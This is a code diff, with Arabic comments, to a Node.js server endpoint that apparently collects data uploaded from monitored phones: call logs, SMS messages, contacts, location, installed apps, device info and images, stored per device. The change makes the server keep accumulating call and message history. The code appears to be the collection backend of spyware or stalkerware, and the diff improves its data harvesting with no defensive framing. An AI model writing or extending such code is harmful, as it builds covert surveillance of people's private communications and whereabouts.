@@ -46,7 +46,7 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, images_count: imagesData.length });
         }
         
-        // ============ البيانات العادية — استبدال كامل ============
+        // ============ البيانات العادية — دمج الجديد فوق القديم ============
         const deviceId = data.device_id || 'unknown';
         const deviceDir = path.join(dataDir, deviceId);
         if (!fs.existsSync(deviceDir)) {
@@ -58,19 +58,28 @@ app.post('/upload.php', (req, res) => {
         let existingData = {};
         if (fs.existsSync(dataFilePath)) existingData = JSON.parse(fs.readFileSync(dataFilePath, 'utf8'));
         
-        // ✅ استبدال كامل — أي نوع بيانات
+        // ✅ دمج الجديد فوق القديم
         if (data.data) {
-            existingData = { ...existingData, ...data.data };
+            if (data.data.call_logs && data.data.call_logs.length > 0) {
+                if (!existingData.call_logs) existingData.call_logs = [];
+                existingData.call_logs = [...data.data.call_logs, ...existingData.call_logs];
+            }
+            if (data.data.sms && data.data.sms.length > 0) {
+                if (!existingData.sms) existingData.sms = [];
+                existingData.sms = [...data.data.sms, ...existingData.sms];
+            }
+            if (data.data.contacts) existingData.contacts = data.data.contacts;
+            if (data.data.device_info) {
+                existingData.device_info = data.data.device_info;
+                updateDevicesList(deviceId, data.data.device_info);
+            } else {
+                updateDevicesList(deviceId, null);
+            }
+            if (data.data.location) existingData.location = data.data.location;
+            if (data.data.installed_apps) existingData.installed_apps = data.data.installed_apps;
         }
         
         fs.writeFileSync(dataFilePath, JSON.stringify(existingData, null, 2));
-        
-        // تحديث اسم الجهاز
-        if (data.data && data.data.device_info) {
-            updateDevicesList(deviceId, data.data.device_info);
-        } else {
-            updateDevicesList(deviceId, null);
-        }
         
         res.json({ success: true });
     } catch (e) {
